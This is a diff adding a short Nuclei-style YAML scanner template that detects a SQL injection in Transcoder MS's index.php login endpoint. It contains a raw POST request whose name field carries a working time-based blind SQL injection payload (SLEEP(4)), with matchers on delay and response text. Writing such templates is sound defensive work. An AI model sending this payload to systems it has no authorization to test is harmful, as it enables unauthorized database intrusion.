@@ -1,0 +1,25 @@
+http:
+    - matchers:
+        - type: word
+          words:
+            - "3333"
+        - dsl:
+            - duration > 4
+          type: dsl
+      matchers-condition: and
+      raw:
+        - |
+          POST /webtrans/index.php?controller=user%action=login HTTP/1.1
+          Host: {{Hostname}}
+          Content-Type: application/x-www-form-urlencoded
+
+          name=testaaa;) AND (SELECT 3333 FROM (SELECT(SLEEP(4)))xSEI) AND ('aFKS'='aFKS&pass=QWR5U2VjCg%3D%3D&lang=zh_CN
+id: transcoder-ms-sqli
+info:
+    author: ProjectDiscoveryAI
+    description: |
+        Detects potential SQL Injection vulnerability in Transcoder MS on the `index.php` endpoint.
+    name: Transcoder MS SQL Injection Detection
+    severity: high
+    tags:
+        - sql-injection
